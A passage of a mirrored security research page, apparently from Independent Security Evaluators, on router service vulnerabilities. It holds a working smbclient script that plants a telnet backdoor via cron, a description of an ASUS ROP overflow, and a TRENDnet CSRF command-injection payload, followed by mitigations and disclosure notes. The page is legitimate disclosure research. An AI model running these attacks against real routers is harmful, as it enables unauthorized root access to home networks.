+cat &gt; activate.sh &lt;&lt;\EOF
+#!/bin/sh
+/tmp/utelnetd -l /bin/sh
+EOF
+smbclient '//192.168.1.1/sda1' -N &lt;&lt;\EOF
+posix
+symlink / root
+cd root/tmp/
+put utelnetd
+chmod 755 utelnetd
+cd cron/
+rename cron.everyminute cron.old
+mkdir cron.everyminute
+cd cron.everyminute
+put activate.sh
+chmod 755 activate.sh
+exit
+EOF
+rm -rf activate.sh
+echo 'Waiting for 60 seconds.....\n'
+sleep 60
+exec telnet 192.168.1.1
+
+</code></pre>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                                <p>&nbsp;</p>
+                                                <h3>ASUS RT-AC66U</h3>
+                                                <p>For the ASUS RT-AC66U, we demonstrate how insufficient bounds
+                                                    checking and the
+                                                    inability to disable network services allowed us to execute
+                                                    arbitrary code with the
+                                                    same permissions as the vulnerable application.</p>
+                                                <p>From its hardened state, with or without USB storage attached, the
+                                                    RT-AC66U runs an
+                                                    ACSD system configuration service on port TCP/5916</p>
+                                                <ol>
+                                                    <li>The ACSD service runs by default, and cannot be disabled (no CVE
+                                                        cataloged).
+                                                    </li>
+                                                    <li>The ACSD service is vulnerable to multiple buffer overflow
+                                                        attacks during the
+                                                        command processing routine (CVE-2013-4659). An attacker can
+                                                        connect to the ACSD
+                                                        service and submit a command string that is larger than the
+                                                        program's fixed
+                                                        length buffer, corrupt the call stack, and change the execution
+                                                        flow of the
+                                                        program by overwriting adjacent memory. The result is the
+                                                        execution of
+                                                        attacker-controlled code.</li>
+                                                </ol>
+                                                <p>For the attack to succeed we utilize return oriented programming
+                                                    (ROP) to avoid stack
+                                                    randomization and MIPS system cache incoherency. In order to create
+                                                    a coherent data
+                                                    cache, our payload utilizes a call to a blocking function, sleep(),
+                                                    which
+                                                    effectively pauses program execution and gives CPU cycles to other
+                                                    executing system
+                                                    processes. When the sleep() function returns, the MIPS CPU flushes
+                                                    the data cache
+                                                    and continues program execution. Finally, we direct the programs
+                                                    execution to our
+                                                    custom shellcode that starts an unauthenticated Telnet server by
+                                                    calling the
+                                                    system() function located in the standard C library.</p>
+                                                <p>A full script for launching this attack against an ASUS AC66U can be
+                                                    found <a
+                                                        href="../../wp-content/themes/IndependentSecurity/download/ASUS_AC66U_ACSD_param.py">here</a>.
+                                                </p>
+                                                <h3>TRENDnet TEW-812DRU</h3>
+                                                <p>For the TRENDnet TEW-812DRU, we demonstrate how vulnerabilities in
+                                                    web applications
+                                                    could lead to a direct compromise of the underlying operating
+                                                    system. For this
+                                                    attack, we demonstrate how insufficient input sanitization and lack
+                                                    of CSRF
+                                                    protection could allow an attacker to execute arbitrary system
+                                                    commands with the
+                                                    same permissions as the vulnerable web application.</p>
+                                                <p>From its hardened state, with or without USB storage attached, the
+                                                    TRENDnet
+                                                    TEW-812DRU contains a web server on port TCP/80 that serves a web
+                                                    application for
+                                                    configuration purposes.</p>
+                                                <ol>
+                                                    <li style="list-style-type: none;">
+                                                        <ol>
+                                                            <li>The web server running on TCP/80 runs by default and
+                                                                cannot be disabled
+                                                                by an administrator (no CVE cataloged).</li>
+                                                            <li>The TEW-812DRU web interface is susceptible to CSRF
+                                                                attacks (CVE
+                                                                pending). A remote attacker can construct a CSRF exploit
+                                                                that causes
+                                                                chosen actions to be performed on behalf of the
+                                                                administrator.</li>
+                                                            <li>The web application served by the TEW-812DRU's web
+                                                                server is vulnerable
+                                                                to multiple command injection attacks (CVE-2013-3365)
+                                                                during the process
+                                                                of performing configuration updates. An attacker with
+                                                                access to these
+                                                                pages can inject commands into the pages shown in the
+                                                                table below, which
+                                                                are executed when the input is sent to the server.</li>
+                                                        </ol>
+                                                    </li>
+                                                </ol>
+                                                <p>&nbsp;</p>
+                                                <table class="summary" width="375">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td style="width: 197.433px;"><b>Page</b></td>
+                                                            <td style="width: 161.567px;"><b>Injection Points</b></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 197.433px;">/internet/ipv6.asp</td>
+                                                            <td style="width: 161.567px;">wan network prefix</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 197.433px;">/adm/management.asp</td>
+                                                            <td style="width: 161.567px;">remote port</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 197.433px;">/internet/wan.asp</td>
+                                                            <td style="width: 161.567px;">pptp username<br /> pptp
+                                                                password<br />
+                                                                ip<br /> gateway<br /> l2tp username<br /> l2tp password
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 197.433px;">/adm/time.asp</td>
+                                                            <td style="width: 161.567px;">NtpDstStart<br />
+                                                                NtpDstEnd<br /> NtpDstOffset
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 197.433px;">/adm/management.asp</td>
+                                                            <td style="width: 161.567px;">device url</td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                                <p>    <b>Table 3.</b>TEW-812DRU injection points</p>
+                                                <ol>
+                                                    <li style="list-style-type: none;">
+                                                        <ol>
+                                                            <li>Leveraging the CSRF vulnerability in 2, and the command
+                                                                injection
+                                                                vulnerability in 3, an attacker can execute arbitrary
+                                                                commands on the
+                                                                TEW-812DRU. For instance, an attacker can submit the
+                                                                following HTML as
+                                                                part of a CSRF attack:
+                                                                <pre>&lt;input type="hidden" name="NtpDstEnd" value="
+`count=0;
+while [ $count -le 25 ];
+do iptables -I INPUT 1 -p tcp --dport 23 -j ACCEPT;
+(( count++ ));
+done;`
+"&gt;
+</pre>
+                                                            </li>
+                                                        </ol>
+                                                    </li>
+                                                </ol>
+                                                <p>&nbsp;</p>
+                                                <ol>
+                                                    <li>After the attack in 4, the TEW-812DRU will have started the
+                                                        router's Telnet
+                                                        daemon and made it accessible from the WAN on TCP/23. The
+                                                        attacker can now
+                                                        access this port to obtain a super user system shell.</li>
+                                                </ol>
+                                                <p>The full attack script is given <a
+                                                        href="../../wp-content/uploads/2017/07/trendnet_csrf.txt">here</a>
+                                                </p>
+                                                <p>&nbsp;</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="pg-391-3" class="panel-grid panel-no-style">
+                                <div id="pgc-391-3-0" class="panel-grid-cell">
+                                    <div id="panel-391-3-0-0"
+                                        class="so-panel widget widget_sow-editor panel-first-child panel-last-child"
+                                        data-index="3">
+                                        <div class="so-widget-sow-editor so-widget-sow-editor-base">
+                                            <div class="siteorigin-widget-tinymce textwidget">
+                                                <h2>Important notes</h2>
+                                                <ul>
+                                                    <li>Disclaimer. ISE did not exhaustively evaluate these routers, and
+                                                        in no way
+                                                        asserts that other product vulnerabilities do not exist. Many of
+                                                        these routers
+                                                        enable by default—or provide the capability to enable—telnet,
+                                                        ftp, and other
+                                                        services that have not been fully investigated. Our research was
+                                                        directed at
+                                                        assessing the ubiquity of these vulnerabilities, and not the
+                                                        number of issues
+                                                        present in any specific router model, or through any particular
+                                                        service or form
+                                                        of attack.</li>
+                                                    <li>Fully updated. Prior to our evaluation, all routers were updated
+                                                        to the latest
+                                                        firmware, and tested with out-of-the-box configuration settings.
+                                                    </li>
+                                                </ul>
+                                                <p> </p>
+                                                <h3>Mitigations</h3>
+                                                <p>Unfortunately, there is little the average end-user can do to fully
+                                                    mitigate these
+                                                    attacks. Successful mitigation often requires a level of
+                                                    sophistication and skill
+                                                    beyond that of the average user (and beyond that of the most likely
+                                                    victims).</p>
+                                                <p><a name="recommendationsVendors"></a></p>
+                                                <h3>Recommendations for Vendors</h3>
+                                                <p>SOHO networking device VENDORS should take the following actions to
+                                                    help mitigate
+                                                    these issues.</p>
+                                                <ul>
+                                                    <li>Prepare and make available firmware upgrades that address these
+                                                        issues.</li>
+                                                    <li>Notify registered users of these vulnerabilities, and distribute
+                                                        instructions on
+                                                        how to upgrade device firmware.</li>
+                                                    <li>Regularly audit devices for security vulnerabilities, produce
+                                                        and distribute
+                                                        security patches in a timely manner, and notify registered
+                                                        customers.</li>
+                                                    <li>Require the manual configuration of these services, rather than
+                                                        enabling them by
+                                                        default, and do not include any services that cannot be
+                                                        disabled.</li>
+                                                </ul>
+                                                <p>SOHO networking device VENDORS should incorporate the following
+                                                    design changes in to
+                                                    their product lines.</p>
+                                                <ul>
+                                                    <li>Using authenticated (digitally signed, and verifiable by the
+                                                        router) firmware
+                                                        updates.</li>
+                                                    <li>Designing a method for automatic firmware updates, that can be
+                                                        opted out of by
+                                                        users.</li>
+                                                    <li>Perform regular security audits to ensure devices are as
+                                                        hardened as possible.
+                                                    </li>
+                                                </ul>
+                                                <p><a name="recommendationsAdmin"></a></p>
+                                                <h3>Recommendations for Device Administrators</h3>
+                                                <p>SOHO networking device ADMINISTRATORS should take the following
+                                                    actions to help
+                                                    mitigate these issues.</p>
+                                                <ul>
+                                                    <li>DO NOT CONNECT USB STORAGE</li>
+                                                    <li>Upgrade your firmware regularly.</li>
+                                                    <li>Disable (or do not enable) remote administration.</li>
+                                                    <li>Disable (or do not enable) network services that are not
+                                                        utilized within the
+                                                        LAN, e.g., FTP, SMB, UPnP.</li>
+                                                    <li>Log out from, and restart, your SOHO networking device after
+                                                        logging in for
+                                                        administrative tasks.</li>
+                                                    <li>Clear browser cookies and active logins after logging out from
+                                                        your router.</li>
+                                                    <li>Choose a non-standard (wireless) LAN IP address range (subnet),
+                                                        which will make
+                                                        generic automated attacks less effective against your network.
+                                                    </li>
+                                                    <li>If possible, enable HTTPS for all administrative connections.
+                                                        For all of the
+                                                        routers we evaluated that had this feature, it was disabled by
+                                                        default.</li>
+                                                    <li>Make sure your WLAN is protected using WPA2 encryption and is
+                                                        not left as an
+                                                        open WiFi network or protected with the outdated WPA or WEP
+                                                        standards.</li>
+                                                    <li>ONLY install firmware from the router manufacturers website.
+                                                    </li>
+                                                    <li>Choose a secure router administration password consisting of
+                                                        upper/lowercase
+                                                        alphanumeric and special characters that is at least 12
+                                                        characters in length.
+                                                    </li>
+                                                    <li>If your SOHO device is behind an additional firewall, restrict
+                                                        inbound access to
+                                                        this device from the greater WAN.</li>
+                                                </ul>
+                                                <p><a name="recommendationsUsers"></a></p>
+                                                <h3>Recommendations for End Users</h3>
+                                                <p>END-USERS behind SOHO networking devices should take the following
+                                                    actions to help
+                                                    mitigate these issues.</p>
+                                                <ul>
+                                                    <li>DO NOT TRUST NETWORK ATTACHED STORAGE provided by these routers.
+                                                    </li>
+                                                    <li>Do not discount browser or other software warnings of potential
+                                                        MITM attacks.
+                                                    </li>
+                                                    <li>Do not follow links sent through email or by other means,
+                                                        especially ones that
+                                                        are directed to what could potentially be a SOHO networking
+                                                        device (e.g.,
+                                                        192.168.2.1).</li>
+                                                    <li>Be diligent, and browse safely.</li>
+                                                </ul>
+                                                <p> </p>
+                                                <h2>Disclosures</h2>
+                                                <p>For all vulnerabilities identified in this research, ISE has
+                                                    disclosed the issues to
+                                                    the product vendors through their typical vulnerability reporting
+                                                    mechanism, as well
+                                                    as any other channels for which we had access. We've given what we
+                                                    believe is
+                                                    adequate time to address the issues disclosed, and to the extent it
+                                                    has been
+                                                    reasonable, we've helped those vendors develop or implement
+                                                    mitigations. We welcome
+                                                    all vendor feedback, and are happy to assist with any additional
+                                                    information that
+                                                    may facilitate a quick resolution to any of these vulnerabilities.
+                                                </p>
+                                                <p>Beyond the vulnerabilities listed in this case study, our research
+                                                    has now brought to
+                                                    light 56 issues that have received Common Vulnerabilities and
+                                                    Exposure (CVE)
+                                                    numbers. They can be found in our vulnerability catalog.</p>
+                                                <h2>Attribution and Acknowledgments</h2>
+                                                <p>This research was conducted by Jacob Holcomb, Stephen Bono, Kedy Lui,
+                                                    Alex Morrow,
+                                                    and Jacob Thompson of Independent Security Evaluators.</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+    <!-- SHAPE
+    ================================================== -->
+    <div class="position-relative">
+    <div class="shape shape-bottom shape-fluid-x svg-shim text-gray-200">
+        <svg viewBox="0 0 2880 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 48h2880V0h-720C1442.5 52 720 0 720 0H0v48z" fill="currentColor"/></svg>
+    </div>
+    </div>
+
+    <!-- FOOTER
+    ================================================== -->
+    <footer class="py-8 py-md-11 bg-gray-200">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 col-md-2">
+
+            <!-- Brand -->
+            <img src="../../assets/img/brand-text.svg" alt="..." class="footer-brand img-fluid mb-2">
+
+
+            <!-- Social -->
+            <ul class="list-unstyled list-inline list-social mb-6 mb-md-0">
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://www.linkedin.com/company/independent-security-evaluators" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/linkedin.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://facebook.com/ISE.infosec" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/facebook.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+              <li class="list-inline-item list-social-item mr-3">
+                <a href="https://twitter.com/ISEsecurity" class="text-decoration-none" rel="noopener">
+                  <img src="../../assets/img/icons/social/twitter.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+            </ul>
+
+            <div class="py-4">
+
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../contact/index.html">Contact Us</a>
+              </h6>
+  
+            </div>
+  
+            <div>
+  
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../privacy-policy/index.html">Privacy Policy</a>
+              </h6>
+  
+            </div>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              About
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../about/values/index.html" class="text-reset">
+                  Company Values
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../about/methodology/index.html" class="text-reset">
+                  Methodology
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../about/leadership/index.html" class="text-reset">
+                  Leadership
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../news/index.html" class="text-reset">
+                  News
+                </a>
+              </li>
+              <li>
+                <a href="../../careers/index.html" class="text-reset">
+                  Careers
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Services
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../services/vulnerability-assessments/index.html" class="text-reset">
+                  Assessments
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../services/security-consulting-services/index.html" class="text-reset">
+                  Consulting
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="https://www.iotvillage.org/" target="_blank" class="text-reset" rel="noopener">
+                  IoT Village <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li">
+                <a href="../../services/training/index.html" class="text-reset" rel="noopener">
+                  Training
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Research
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-0">
+              <li class="mb-3">
+                <a href="../index.html" class="text-reset">
+                  Studies & Papers
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../talks/index.html" class="text-reset">
+                  Talks
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../blog/index.html" class="text-reset" rel="noopener">
+                  Blog <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../start/blog/index.html" class="text-reset" rel="noopener">
+                  VRM/TPRM Articles
+                </a>
+
+            </ul>
+
+          </div>
+
+          <div class="col-12 col-md-4">
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Stay up to date on the latest research and industry trends. Sign up for our newsletter
+            </h6>
+            <!-- Heading -->
+            <!--[if lte IE 8]>
+            <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
+            <![endif]-->
+            <script charset="utf-8" type="text/javascript" src="../../../js.hsforms.net/forms/v2.js"></script>
+            <script>
+            hbspt.forms.create({
+            region: "na1",
+            portalId: "7197110",
+            formId: "e868052f-9574-4c5b-a8e0-6233b8b6b6d2"
+            });
+            </script>
+
+          </div>
+
+        </div> <!-- / .row -->
+      </div> <!-- / .container -->
+    </footer>
+
+    <!-- JAVASCRIPT
+    ================================================== -->
+    <!-- Libs JS -->
+    <script src="../../assets/libs/jquery/dist/jquery.min.js"></script>
+    <script src="../../assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.js"></script>
+    <script src="../../assets/libs/aos/dist/aos.js"></script>
+
+    <!-- <script src="../../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> -->
+    <!-- <script src="../../assets/libs/countup.js/dist/countUp.min.js"></script> -->
+    <!-- <script src="../../assets/libs/dropzone/dist/min/dropzone.min.js"></script> -->
+    <!-- <script src="../../assets/libs/flickity/dist/flickity.pkgd.min.js"></script>
+    <script src="../../assets/libs/flickity-fade/flickity-fade.js"></script>
+    <script src="../../assets/libs/highlightjs/highlight.pack.min.js"></script> -->
+    <script src="../../assets/libs/imagesloaded/imagesloaded.pkgd.min.js"></script>
+    <!-- <script src="../../assets/libs/isotope-layout/dist/isotope.pkgd.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax-video.min.js"></script> -->
+    <!-- <script src="../../assets/libs/jarallax/dist/jarallax-element.min.js"></script> -->
+    <!-- <script src="../../assets/libs/quill/dist/quill.min.js"></script> -->
+    <!-- <script src="../../assets/libs/smooth-scroll/dist/smooth-scroll.min.js"></script> -->
+     <script src="../../assets/libs/typed.js/lib/typed.min.js"></script>
+
+    <!-- Map -->
+    <!-- <script src='https://api.mapbox.com/mapbox-gl-js/v0.53.0/mapbox-gl.js'></script> -->
+
+    <!-- Theme JS -->
+    <script src="../../assets/js/theme.min.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from www.ise.io/research/soho_service_hacks/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:23 GMT -->
+</html>
